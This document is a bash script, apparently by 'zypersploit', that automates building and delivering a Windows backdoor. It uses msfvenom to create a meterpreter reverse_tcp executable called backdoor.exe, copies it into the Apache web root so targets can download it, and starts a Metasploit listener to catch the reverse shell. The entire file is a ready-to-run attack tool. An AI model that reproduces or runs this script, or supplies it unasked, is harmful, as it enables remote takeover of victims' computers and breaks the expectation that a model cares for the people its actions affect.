#!/bin/bash

clear

echo -e "\033[33mRunning setup and backdoor creation...\033[0m"
echo -e "\033[34mCreated by zypersploit or most known as barryjensen-dev\033[0m"
echo

check_command() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Error: $1 is not installed. Please install it and try again."
    echo "Consider using your package manager (e.g., apt-get, yum)."
    exit 1
  }
}

check_command "msfvenom"
check_command "msfconsole"

detect_eth0_ip() {
  local ip
  ip=$(ip a show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
  if [ -z "$ip" ]; then
    echo "Warning: Could not detect IP from eth0. Trying alternative method..."
    ip=$(hostname -I | awk '{print $1}')
  fi
  echo "$ip"
}

echo "Detecting local IP address (LHOST)..."
LHOST=$(detect_eth0_ip)

if [ -z "$LHOST" ]; then
  echo "Error: Unable to detect the local IP address (LHOST)."
  exit 1
fi

echo "Local IP address detected as LHOST: $LHOST"

echo "Enter the port number (LPORT) to use for the listener (default: 4444):"
read LPORT

if [[ ! "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1024 ] || [ "$LPORT" -gt 65535 ]; then
  echo "Invalid port number. Using default port 4444."
  LPORT=4444
fi

clear

echo "Creating payload with LHOST=$LHOST and LPORT=$LPORT..."

sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o backdoor.exe PASSWORD=your_strong_password

if [ ! -f "backdoor.exe" ]; then
  echo "Error: Failed to create payload. Please check your msfvenom installation and try again."
  exit 1
fi

echo "** Warning: Placing backdoor directly in /var/www/html is insecure!**"
echo "** Consider using a virtual host for isolation. **"

read -p "Continue placing backdoor in /var/www/html? (y/N) " -n 1 -r
echo

if [[ $REPLY =~ ^[Yy]$ ]]; then
  echo "Moving payload to /var/www/html/..."
  sudo mv backdoor.exe /var/www/html/

  echo "Setting executable permissions for the payload..."
  sudo chmod +x /var/www/html/backdoor.exe

  echo "Starting Apache2 service..."
  if ! pgrep -x "apache2" > /dev/null; then
    sudo service apache2 start
  else
    echo "Apache2 is already running."
  fi

  echo "Setting up Metasploit listener..."

  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"

  echo -e "\033[32mGoodbye!\033[0m"
  echo
fi
